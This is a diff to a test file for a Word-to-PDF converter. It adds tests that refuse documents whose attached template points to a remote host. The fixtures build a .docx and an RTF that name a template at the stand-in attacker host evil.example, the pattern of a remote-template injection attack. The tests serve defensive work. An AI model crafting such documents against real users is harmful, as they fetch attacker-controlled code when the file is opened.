@@ -4,10 +4,13 @@ const fs = require('fs');
 const os = require('os');
 const path = require('path');
 const { createDocConverter, routeFor } = require('../lib/doc-convert');
+const { buildDocx, outside } = require('./zip-builder');
 
 const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'notch-doc-'));
 test.after(() => fs.rmSync(dir, { recursive: true, force: true }));
-const touch = (name, text = 'x') => { const p = path.join(dir, name); fs.writeFileSync(p, text); return p; };
+const CLEAN_DOCX = buildDocx([]);
+// A file called .docx gets real Word-document contents, because a fake one is (rightly) refused.
+const touch = (name, content = name.endsWith('.docx') ? CLEAN_DOCX : 'x') => { const p = path.join(dir, name); fs.writeFileSync(p, content); return p; };
 
 // A pretend Word: writes the output file the way the real script would.
 function setup({ fail = '', writes = true } = {}) {
@@ -41,7 +44,7 @@ test('Word to PDF saves next to the original under a new name and never overwrit
   assert.ok(!converter.canReveal(source));
   const second = await converter.convert({ sourcePath: source, to: 'pdf' });
   assert.strictEqual(second.name, 'report (converted 2).pdf');
-  assert.strictEqual(fs.readFileSync(source, 'utf8'), 'x', 'the original is untouched');
+  assert.ok(fs.readFileSync(source).equals(CLEAN_DOCX), 'the original is untouched');
   assert.ok(calls[0].args.includes('-NoProfile') && calls[0].args.includes('-In') && calls[0].args.includes(source));
   assert.strictEqual(calls[0].file, 'powershell.exe');
   assert.ok(calls[0].options.timeout > 0);
@@ -80,4 +83,52 @@ test('one conversion at a time, so Word is never driven twice at once', async ()
   const a = touch('q1.docx'); const b = touch('q2.docx');
   await Promise.all([converter.convert({ sourcePath: a, to: 'pdf' }), converter.convert({ sourcePath: b, to: 'pdf' })]);
   assert.strictEqual(most, 1);
+});
+
+test('a document with a link to another address is refused before Word is started', async () => {
+  const { converter, calls } = setup();
+  const linked = touch('linked.docx', buildDocx([outside('rId1', 'attachedTemplate', 'http://evil.example/t.dotm')]));
+  await assert.rejects(() => converter.convert({ sourcePath: linked, to: 'pdf' }), /another address.*not converted/i);
+  assert.strictEqual(calls.length, 0, 'Word never saw the file');
+  assert.strictEqual(fs.readdirSync(dir).filter((f) => f.startsWith('linked (converted')).length, 0, 'nothing was made');
+});
+
+test('the check looks at the contents, not the file name', async () => {
+  const { converter, calls } = setup();
+  const hostile = buildDocx([outside('rId1', 'attachedTemplate', 'http://evil.example/t.dotm')]);
+  for (const name of ['looks-like.rtf', 'looks-like.doc', 'looks-like.odt']) {
+    await assert.rejects(() => converter.convert({ sourcePath: touch(name, hostile), to: 'pdf' }), /another address/i, name);
+  }
+  await assert.rejects(() => converter.convert({ sourcePath: touch('looks-like.pdf', hostile), to: 'docx' }), /another address/i);
+  assert.strictEqual(calls.length, 0);
+});
+
+test('a file called .docx that is not a real Word document is refused', async () => {
+  const { converter, calls } = setup();
+  await assert.rejects(() => converter.convert({ sourcePath: touch('fake.docx', 'this is plain text, not a zip'), to: 'pdf' }), /not a real Word document/i);
+  assert.strictEqual(calls.length, 0);
+});
+
+test('a document that cannot be checked is refused, not trusted', async () => {
+  const { converter, calls } = setup();
+  const cutOff = CLEAN_DOCX.subarray(0, CLEAN_DOCX.length - 10);
+  await assert.rejects(() => converter.convert({ sourcePath: touch('cut.docx', cutOff), to: 'pdf' }), /could not be checked/i);
+  assert.strictEqual(calls.length, 0);
+});
+
+test('ordinary clickable web links, and older formats that cannot carry the trick, still convert', async () => {
+  const { converter, calls } = setup();
+  const withHyperlink = touch('with-link.docx', buildDocx([outside('rId1', 'hyperlink', 'https://example.com/')]));
+  assert.strictEqual((await converter.convert({ sourcePath: withHyperlink, to: 'pdf' })).name, 'with-link (converted).pdf');
+  assert.strictEqual((await converter.convert({ sourcePath: touch('old.rtf', '{\\rtf1\\ansi Hello.\\par}'), to: 'pdf' })).name, 'old (converted).pdf');
+  assert.strictEqual(calls.length, 2);
+});
+
+test('an RTF that names a remote template is refused before Word is started, and an ordinary RTF still converts', async () => {
+  const { converter, calls } = setup();
+  await assert.rejects(() => converter.convert({ sourcePath: touch('remote.rtf', '{\\rtf1\\ansi{\\*\\template http://evil.example/t.dotm}Hello}'), to: 'pdf' }), /another address/i);
+  assert.strictEqual(calls.length, 0);
+  const saved = '{\\rtf1\\ansi{\\*\\template C:\\\\Users\\\\Me\\\\Normal.dotm}Hello}'; // how Word itself saves one
+  assert.strictEqual((await converter.convert({ sourcePath: touch('fine.rtf', saved), to: 'pdf' })).name, 'fine (converted).pdf');
+  assert.strictEqual(calls.length, 1);
 });
